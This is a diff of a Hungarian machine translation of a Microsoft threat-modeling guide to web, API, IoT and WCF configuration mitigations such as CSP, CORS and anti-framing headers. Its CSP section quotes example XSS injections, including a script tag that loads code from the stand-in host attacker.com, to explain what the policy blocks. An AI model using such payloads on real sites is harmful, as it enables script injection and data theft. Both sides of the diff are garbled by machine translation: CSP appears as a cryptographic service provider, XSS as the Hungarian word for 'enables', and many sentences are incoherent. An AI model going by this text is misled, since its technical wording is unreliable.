@@ -1,6 +1,6 @@
 ---
-title: "-Microsoft fenyegetések modellezése eszköz - kezelés Azure aaaConfiguration |} Microsoft Docs"
-description: "a fenyegetések modellezése eszköz hello felfedett fenyegetések megoldást"
+title: "Konfigurációs felügyeleti - Microsoft fenyegetés modellezési eszköz - Azure |} Microsoft Docs"
+description: "a fenyegetések modellezése eszköz felfedett fenyegetések megoldást"
 services: security
 documentationcenter: na
 author: RodSan
@@ -14,21 +14,21 @@ ms.devlang: na
 ms.topic: article
 ms.date: 08/17/2017
 ms.author: rodsan
-ms.openlocfilehash: 77aa4352fa61e928a1b7a4ff1d488a55d3d9b970
-ms.sourcegitcommit: 523283cc1b3c37c428e77850964dc1c33742c5f0
+ms.openlocfilehash: 114666d0c173786373e3bdd025027eb217922749
+ms.sourcegitcommit: 18ad9bc049589c8e44ed277f8f43dcaa483f3339
 ms.translationtype: MT
 ms.contentlocale: hu-HU
-ms.lasthandoff: 10/06/2017
+ms.lasthandoff: 08/29/2017
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldást 
 | A termék vagy szolgáltatás | Cikk |
 | --------------- | ------- |
-| **Webalkalmazás** | <ul><li>[Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript](#csp-js)</li><li>[Böngésző lehetővé szűrő engedélyezése](#xss-filter)</li><li>[ASP.NET-alkalmazások le kell tiltania előzetes toodeployment nyomkövetéséhez és](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett](#cors-aspnet)</li><li>[ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata](#local-js)</li><li>[Tiltsa le az automatikus MIME-elemzése](#mime-sniff)</li><li>[Távolítsa el a Windows Azure-webhelyek tooavoid ujjlenyomat általános jogú kiszolgálói-fejlécei](#standard-finger)</li></ul> |
+| **Webalkalmazás** | <ul><li>[Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript](#csp-js)</li><li>[Böngésző lehetővé szűrő engedélyezése](#xss-filter)</li><li>[ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett](#cors-aspnet)</li><li>[ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata](#local-js)</li><li>[Tiltsa le az automatikus MIME-elemzése](#mime-sniff)</li><li>[Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében](#standard-finger)</li></ul> |
 | **Adatbázis** | <ul><li>[A Windows tűzfal konfigurálása a hozzáféréshez](#firewall-db)</li></ul> |
 | **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett](#cors-api)</li><li>[Titkosítani bizalmas adatokat tartalmazó Web API konfigurációs fájljainak szakaszait](#config-sensitive)</li></ul> |
-| **IoT-eszközök** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak hello minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
-| **Az IoT-mező átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy hello mező átjáró hello alapértelmezett bejelentkezési hitelesítő adatok megváltoznak a telepítés során](#default-change)</li></ul> |
-| **Az IoT átjáró** | <ul><li>[Győződjön meg arról, hogy hello Felhőátjáróhoz valósítja meg a folyamat tookeep hello csatlakoztatott eszközök belső vezérlőprogram toodate mentése](#cloud-firmware)</li></ul> |
+| **IoT-eszközök** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
+| **Az IoT-mező átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva](#default-change)</li></ul> |
+| **Az IoT átjáró** | <ul><li>[Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása](#cloud-firmware)</li></ul> |
 | **Gép megbízhatósági kapcsolat határán** | <ul><li>[Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő](#controls-policies)</li></ul> |
 | **Azure Storage** | <ul><li>[Az Azure storage elérési kulcsok biztonságos kezelése](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[A WCF szolgáltatás szabályozásával engedélyezése](#throttling)</li><li>[WCF-adatokhoz való illetéktelen hozzáférés metaadatok keresztül](#info-metadata)</li></ul> | 
@@ -41,15 +41,15 @@ ms.lasthandoff: 10/06/2017
 | **SDL fázis**               | Felépítés |  
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
-| **Hivatkozások**              | [Egy bevezető tooContent biztonsági házirend](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [bemutatása toocontent biztonsági házirend](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **Lépések** | <p>Tartalom biztonsági házirend (CSP) egy egy védelmi jellegű biztonsági mechanizmus, egy szabványos, W3C, amely lehetővé teszi, hogy a webes alkalmazás tulajdonosok toohave vezérlő a helyükön lévő beágyazott hello a tartalomhoz. Kriptográfiai Szolgáltató egy HTTP-válaszfejléc hello webkiszolgálón meg van adva, és kikényszeríti a hello ügyféloldali böngészőkben. Egy engedélyezési lista-alapú házirend - webhely deklarálhatnak mely aktív tartalom a megbízható tartományok készlete, például JavaScript tölthetők be.</p><p>Kriptográfiai szolgáltató a következő biztonsági szempontból előnyökkel járhat hello:</p><ul><li>**Védelmet biztosít a lehetővé:** Ha egy lap sebezhető tooXSS, egy támadó kihasználhatja azt 2 módon:<ul><li>Szúrjon `<script>malicious code</script>`. A biztonsági rés nem fog működni a korlátozás-1-miatt tooCSP tartozó alapja</li><li>Szúrjon `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés nem fog működni, mert hello általa tartomány nem lesz a felhőbeli Szolgáltató engedélyezett tartományok</li></ul></li><li>**Adatok exfiltration szabályozhatják:** bármilyen weblap rosszindulatú tartalmat próbál tooconnect tooan külső webhely és eltulajdonít adatokat, ha hello kapcsolat megszakította CSP-hez. Ennek az az oka hello céltartomány nem lesz a felhőbeli Szolgáltató engedélyezési lista</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával, amely egy ellenfél is keret eredeti webhely és a felhasználók tooclick kényszerítése a felhasználói felületi elemei. Jelenleg kattintson-emelési elleni védelmet egy fejléc-X-keret-válaszbeállítások beállításával valósul meg. Nem minden böngésző, figyelembe vegyék ezt a fejlécet, és előre CSP fog a szokásos módon toodefend kattintson-emelési ellen</li><li>**Valós idejű támadás reporting:** injektálási támadást egy CSP-kompatibilis webhelyen van, ha böngészők automatikusan vált egy értesítési tooan végpont hello webkiszolgáló konfigurálva. Ezzel a módszerrel CSP valós idejű figyelmeztető rendszer funkcionál.</li></ul> |
+| **Hivatkozások**              | [Tartalom biztonsági házirend bemutatása](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirendbemutatása](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **Lépések** | <p>Tartalom biztonsági házirend (CSP), akkor egy védelemmel az olyan jellegű biztonsági eszköz, a W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a tartalmat a helyükön lévő beágyazott. Kriptográfiai Szolgáltató a webkiszolgálón HTTP-válaszfejléc meg van adva, és kikényszeríti a ügyféloldali böngészőkben. Egy engedélyezési lista-alapú házirend - webhely deklarálhatnak mely aktív tartalom a megbízható tartományok készlete, például JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**Védelmet biztosít a lehetővé:** Ha egy lap lehetővé téve, egy támadó kihasználhatja azt 2 módon:<ul><li>Szúrjon `<script>malicious code</script>`. A biztonsági rés nem fog működni a felhőbeli Szolgáltató talál korlátozás-1 miatt</li><li>Szúrjon `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés nem fog működni, mivel az általa tartomány nem a felhőbeli Szolgáltató engedélyezett tartományok</li></ul></li><li>**Adatok exfiltration szabályozhatják:** Ha bármely rosszindulatú tartalmat weblapon megkísérli a külső webhelyek csatlakozhat, és ellopják adatok, a kapcsolat megszakította CSP-hez. Ez azért, mert a célként megadott tartomány nem lesz a felhőbeli Szolgáltató engedélyezési lista</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával, amely egy ellenfél is keret a tényleges webhely és a kényszerített felhasználók felhasználói felületi elemei. Jelenleg kattintson-emelési elleni védelmet egy fejléc-X-keret-válaszbeállítások beállításával valósul meg. Nem minden böngésző, figyelembe vegyék ezt a fejlécet, és előre CSP is szabványos módon kattintson-emelési elleni védelemre</li><li>**Valós idejű támadás reporting:** Ha injektálási támadást egy CSP-kompatibilis webhelyen van, böngészők automatikusan vált az a webkiszolgálón beállított végpont üzenetszintű értesítést. Ezzel a módszerrel CSP valós idejű figyelmeztető rendszer funkcionál.</li></ul> |
 
 ### <a name="example"></a>Példa
 Példa házirend: 
 ```C#
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Ez a házirend lehetővé teszi, hogy a parancsfájlok tooload csak a hello webes alkalmazás kiszolgáló és a google analytics kiszolgálón. Bármely más helyről betöltött parancsprogramok a program elutasítja. Ha CSP engedélyezve van a webhelyen, hello következő funkciók válnak automatikusan letiltott toomitigate lehetővé támadásokat. 
+Ez a házirend lehetővé teszi, hogy a parancsprogramok töltendők be, csak a a webes alkalmazás kiszolgáló és a google analytics kiszolgálón. Bármely más helyről betöltött parancsprogramok a program elutasítja. Kriptográfiai Szolgáltató engedélyezve van a webhely, amikor a program automatikusan letiltja a következő funkciók lehetővé támadások mérséklése. 
 
 ### <a name="example"></a>Példa
 Beágyazott parancsfájlokra nem fogja végrehajtani. Az alábbiakban példákat beágyazott parancsfájlokra 
@@ -74,9 +74,9 @@ Example: var str="alert(1)"; eval(str);
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Lehetővé védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
-| **Lépések** | <p>X-lehetővé-védelmet válasz fejléce konfigurációs vezérlők hello böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:`Ezzel a lépéssel letiltja hello szűrő</li><li>`1: Filter enabled`Ha egy többhelyes parancsfájl-kezelési támogatás észlel, az order toostop hello támadások, hello böngésző fog sanitize hello lap</li><li>`1: mode=block : Filter enabled`. Helyett sanitize hello lapon, a lehetővé támadás észlelése esetén, hello böngésző megakadályozza, hogy megjelenítési hello lap</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. hello böngésző fog sanitize hello oldal és a jelentés hello megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések toosend részletek tooa az Ön által választott URI króm függvényt. hello utolsó 2 beállítások minősülnek biztonságos értékeket.</p>|
+| **Lépések** | <p>X-lehetővé-védelmet válasz konfiguráció szabályozza a böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:`Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled`Ha egy többhelyes parancsfájl-kezelési támogatás észlel, ahhoz, hogy a támadást, állítsa le a böngésző fog sanitize a lap</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy a lap sanitize, a lehetővé támadás észlelése esetén, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző sanitize a lapot, és a jelentést a megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések küldése az Ön által választott URI króm függvényt. Az elmúlt 2 beállítások biztonságos értékek számítanak.</p>|
 
-## <a id="trace-deploy"></a>ASP.NET-alkalmazások le kell tiltania előzetes toodeployment nyomkövetéséhez és
+## <a id="trace-deploy"></a>ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania
 
 | Cím                   | Részletek      |
 | ----------------------- | ------------ |
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET követés áttekintése](http://msdn2.microsoft.com/library/bb386420.aspx), [How to: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
-| **Lépések** | Hello lap nyomkövetése engedélyezve van, amikor is a kért minden böngésző jut hozzá a belső kiszolgáló állapota és a munkafolyamat adatait tartalmazó hello nyomkövetési adatokat. Ez az információ biztonsági bizalmas lehet. Hello lap engedélyezve van a hibakeresés során hiba történt az hello kiszolgáló akár egy teljes verem nyomkövetési adatok toohello böngésző jelenik meg. Adatok biztonsági szempontból kényes információt hello server munkafolyamat tehetik közzé. |
+| **Lépések** | Ha nyomkövetése engedélyezve van a lap minden böngésző is jut hozzá a belső kiszolgáló állapota és a munkafolyamat adatait tartalmazó nyomkövetési adatokat kér. Ez az információ biztonsági bizalmas lehet. Hibakeresés engedélyezve van a lapon, ha hiba történik a kiszolgálón egy teljes verem nyomkövetési adatok jelenik meg a böngésző eredményez. Adatok biztonsági szempontból kényes információt a kiszolgálói munkafolyamat tehetik közzé. |
 
 ## <a id="js-trusted"></a>Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó
 
@@ -96,7 +96,7 @@ Example: var str="alert(1)"; eval(str);
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. hello hivatkozás végpontok mindig SSL kell lennie. |
+| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. A referencia-végpontokat kell lennie az SSL. |
 
 ## <a id="ui-defenses"></a>Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel
 
@@ -107,10 +107,10 @@ Example: var str="alert(1)"; eval(str);
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Védelmi Cheat lap kattintson-emelési OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
-| **Lépések** | <p>Kattintson-emelési, más néven a "felhasználói felület jogorvoslati támadás", akkor, ha egy támadó használ több átlátszó vagy nem átlátszó rétegek tootrick egy felhasználó át egy gombra való kattintást vagy hivatkozás az egy másik lapon, ha azok volt szándékos volt tooclick hello legfelső szintű lapon.</p><p>Ez a réteges létrehozásával iframe, amelyet az áldozat hello lapon be egy rosszindulatú lapon érhető el. Ebből kifolyólag hello támadó "térít" kattint azt jelentette, hogy a lap és útválasztási őket tooanother lap, nagy valószínűséggel tulajdonosa egy másik alkalmazás, tartomány, vagy mindkettőt. tooprevent kattintson-emelési támadások set hello megfelelő X-keret-beállítások HTTP-válaszfejlécek, melyek arra utasítják hello böngésző toonot engedélyezése keretezés más tartományokból</p>|
+| **Lépések** | <p>kattintással emelési néven is ismert a "felhasználói felület jogorvoslati támadás", akkor, ha egy támadó használ több átlátszó vagy nem átlátszó réteg felhasználót: a felhasználó a gombra kattintva vagy csatlakoztatása egy másik lapon, ha azok volt kívánó lapon a legfelső szintű.</p><p>Ez a réteges létrehozásával egy rosszindulatú lapon iframe, amely betölti az áldozat oldalon érhető el. Ebből kifolyólag a támadó "térít" gombra kell kattintania azt jelentette, hogy a lap és útválasztási őket egy másik lapra, nagy valószínűséggel tulajdonosa egy másik alkalmazás, tartomány, vagy mindkettőt. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-beállítások HTTP-válaszfejlécek, melyek arra utasítják a böngésző számára más tartományokból keretezési engedélyezi</p>|
 
 ### <a name="example"></a>Példa
-hello X-keret-beállítások fejlécet az IIS web.config keresztül állítható be. Web.config kódrészletet, amely soha nem keretezhető helyek: 
+Az X-keret-beállítások fejlécet az IIS web.config keresztül állítható be. Web.config kódrészletet, amely soha nem keretezhető helyek: 
 ```C#
     <system.webServer>
         <httpProtocol>
@@ -122,7 +122,7 @@ hello X-keret-beállítások fejlécet az IIS web.config keresztül állítható
 ```
 
 ### <a name="example"></a>Példa
-Lapok csak keretezhető által helyek Web.config kódját a hello azonos tartományban: 
+Web.config kód csak keretezhető ugyanabban a tartományban lap webhelyekhez: 
 ```C#
     <system.webServer>
         <httpProtocol>
@@ -142,10 +142,10 @@ Lapok csak keretezhető által helyek Web.config kódját a hello azonos tartom�
 | **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek tooanother tartomány. Ez a korlátozás hello azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha előfordulhat, hogy szükséges tooexpose API-k biztonságosan, amely más webhelyek is felhasználhatnak. Közötti Origin Resource Sharing (CORS) van olyan W3C szabvány, amely lehetővé teszi, hogy a kiszolgáló toorelax hello azonos eredetű házirend. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz tooadding néhány HTTP-válaszfejlécek (hozzáférés - vezérlési-*) toohello webes alkalmazás, és ez több módon is végrehajtható.</p>|
+| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlési-*) a webes alkalmazás, és ez végezhető el több módon.</p>|
 
 ### <a name="example"></a>Példa
-Ha hozzáférés tooWeb.config érhető el, majd CORS segítségével is hozzáadhat hello a következő kódot: 
+Ha Web.config rendelkezésére áll, majd a CORS segítségével is hozzáadhat a következő kódot: 
 ```XML
 <system.webServer>
     <httpProtocol>
@@ -157,12 +157,12 @@ Ha hozzáférés tooWeb.config érhető el, majd CORS segítségével is hozzáa
 ```
 
 ### <a name="example"></a>Példa
-Ha access tooweb.config nem érhető el, majd CORS konfigurálható csharp nyelvű kód a következő hello hozzáadásával: 
+Ha web.config való hozzáférés nem érhető el, majd CORS konfigurálhatja a következő csharp nyelvű kód felvétele: 
 ```C#
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
 ```
 
-Vegye figyelembe, hogy a rendszer, amely tartalmazza a "Hozzáférés-vezérlési-engedélyezése – Origin" attribútum lista hello kritikus tooensure állítsa tooa végesnek és megbízható készletét tartalmazza. Ezen helytelenül eljárva sikertelen tooconfigure (mint pl. hello érték "*") lehetővé teszi rosszindulatú webhelyeket tootrigger közötti eredetű kérések toohello webalkalmazás > nélkül korlátozások, ezáltal hello alkalmazás sebezhető tooCSRF támadások. 
+Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a lista tartalmazza a "Hozzáférés-vezérlési-engedélyezése – Origin" attribútum van beállítva források végesnek és megbízható készlete. Nem sikerült konfigurálni a helytelenül eljárva (pl., mint érték "*") lehetővé teszi a rosszindulatú webhelyeket közötti eredetű kérések a webalkalmazás elindítása > nélkül korlátozások, ezáltal az alkalmazás a CSRF támadásokkal szemben sebezhető. 
 
 ## <a id="validate-aspnet"></a>ASP.NET-lapok ValidateRequest attribútum engedélyezése
 
@@ -173,7 +173,7 @@ Vegye figyelembe, hogy a rendszer, amely tartalmazza a "Hozzáférés-vezérlés
 | **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [Kérelem érvényesítése - parancsfájl támadások megelőzése](http://www.asp.net/whitepapers/request-validation) |
-| **Lépések** | <p>Kérelem érvényesítése, a szolgáltatás az ASP.NET 1.1-es verzió óta megakadályozza, hogy a hello kiszolgáló elfogadása tartalmazó nem kódolt HTML tartalom. Ez a szolgáltatás úgy van kialakítva, toohelp amellyel ügyfél parancsfájlkód vagy HTML lehet a tudtukon elküldött tooa kiszolgáló tárolja, és ezután tooother felhasználók parancsfájl-injektálás a támadások megelőzése. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolására, amikor szükséges.</p><p>Kérelem érvényesítése az összes bemeneti adatok tooa lista potenciálisan veszélyes értékek összehasonlításával történik. Egyezés akkor fordul elő, ha az ASP.NET kivált egy `HttpRequestValidationException`. Kérelem érvényesítése funkció alapértelmezés szerint engedélyezve van.</p>|
+| **Lépések** | <p>Kérelem érvényesítése, a szolgáltatás az ASP.NET 1.1-es verzió óta megakadályozza, hogy a kiszolgáló elfogadása tartalmazó nem kódolt HTML tartalom. Ez a funkció célja, amellyel ügyfél parancsfájlkód vagy HTML is kell tudtukon továbbíthatók a kiszolgálóhoz, tárolt és jelenik majd meg a más felhasználók számára a parancsfájl-injektálás támadások megelőzése érdekében. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolására, amikor szükséges.</p><p>Kérelem érvényesítése potenciálisan veszélyes értékből álló lista összes bemeneti adatot összevetésével történik. Egyezés akkor fordul elő, ha az ASP.NET kivált egy `HttpRequestValidationException`. Kérelem érvényesítése funkció alapértelmezés szerint engedélyezve van.</p>|
 
 ### <a name="example"></a>Példa
 Azonban ez a szolgáltatás letiltható lap szinten: 
@@ -199,7 +199,7 @@ Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatot
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | N/A  |
-| **Lépések** | <p>Standard JavaScript-könyvtárak JQuery kell használnia, mint segítségével a fejlesztők jóváhagyott közös JavaScript-tárak, amelyek nem tartalmaznak ismert biztonsági hiányosságokat verzióját. Bevált gyakorlat toouse hello a legújabb verzióra hello szalagtárak azért, mert a biztonsági javításokat az ismert biztonsági rések a régebbi verzióját a tartalmaznak.</p><p>Hello legújabb kiadására toocompatibility okok miatt nem használható, ha hello minimális verziója alatt kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1-es</li><li>JQuery ciklus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-vezérlő eszközkészlet**<ul><li>AJAX-vezérlő eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms keretrendszerre és Ajax**<ul><li>Az ASP.NET Web Forms keretrendszerre és Ajax 4</li><li>Az ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem tölthető be egyetlen JavaScript kódtár külső helyekről, például a nyilvános tartalomtovábbító</p>|
+| **Lépések** | <p>Standard JavaScript-könyvtárak JQuery kell használnia, mint segítségével a fejlesztők jóváhagyott közös JavaScript-tárak, amelyek nem tartalmaznak ismert biztonsági hiányosságokat verzióját. Egy jó gyakorlat az, hogy a szalagtárak legtöbb legújabb verzióját használja, mivel a régebbi verzióját az ismert biztonsági rések biztonsági javításokat tartalmaznak.</p><p>Ha a legújabb verzióra való kompatibilitás miatt miatt nem használható az alábbi minimális verziók kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1-es</li><li>JQuery ciklus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-vezérlő eszközkészlet**<ul><li>AJAX-vezérlő eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms keretrendszerre és Ajax**<ul><li>Az ASP.NET Web Forms keretrendszerre és Ajax 4</li><li>Az ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem tölthető be egyetlen JavaScript kódtár külső helyekről, például a nyilvános tartalomtovábbító</p>|
 
 ## <a id="mime-sniff"></a>Tiltsa le az automatikus MIME-elemzése
 
@@ -210,10 +210,10 @@ Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatot
 | **Alkalmazandó technológiák** | Általános |
 | **Attribútumok**              | N/A  |
 | **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelmének](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
-| **Lépések** | X-tartalom-típust-beállítások hello fejléc egy HTTP-fejlécet, amely lehetővé teszi a fejlesztők számára, hogy a tartalmat nem kell MIME-felszippantásra toospecify. Ezt a fejlécet tervezett toomitigate MIME-elemzése támadások. Az egyes lapok tartalmazhatnak felhasználói ellenőrizhető tartalmat, használnia kell a HTTP-fejléc X hello-tartalom-típust-beállítások: nosniff. tooenable hello szükséges fejléc globálisan hello alkalmazás összes lapja esetében, akkor teheti hello következő|
+| **Lépések** | Az X-tartalom-típust-beállítások fejlécet, amely lehetővé teszi a fejlesztők számára adja meg, hogy a tartalmat nem kell MIME-felszippantásra HTTP-fejléc. Ezt a fejlécet védelme az MIME-elemzés célja. Az egyes lapok tartalmazhatnak felhasználói ellenőrizhető tartalmat, használnia kell a HTTP-fejléc X-tartalom-típust-beállítások: nosniff. A kötelező fejlécet globálisan az alkalmazás összes lapja esetében engedélyezni, tegye a következők valamelyikét|
 
 ### <a name="example"></a>Példa
-Hello fejléc hozzáadása hello web.config fájlban, ha hello alkalmazás által az Internet Information Services (IIS) 7 és újabb verziók esetében. 
+A fejléc hozzáadása a web.config fájlban, ha az alkalmazás által az Internet Information Services (IIS) 7 és újabb verziók esetében. 
 ```XML
 <system.webServer>
 <httpProtocol>
@@ -225,7 +225,7 @@ Hello fejléc hozzáadása hello web.config fájlban, ha hello alkalmazás álta
 ```
 
 ### <a name="example"></a>Példa
-Hello keresztül hello fejléc hozzáadása globális alkalmazás\_BeginRequest 
+A globális alkalmazáson keresztül fejléc hozzáadása\_BeginRequest 
 ```C#
 void Application_BeginRequest(object sender, EventArgs e)
 {
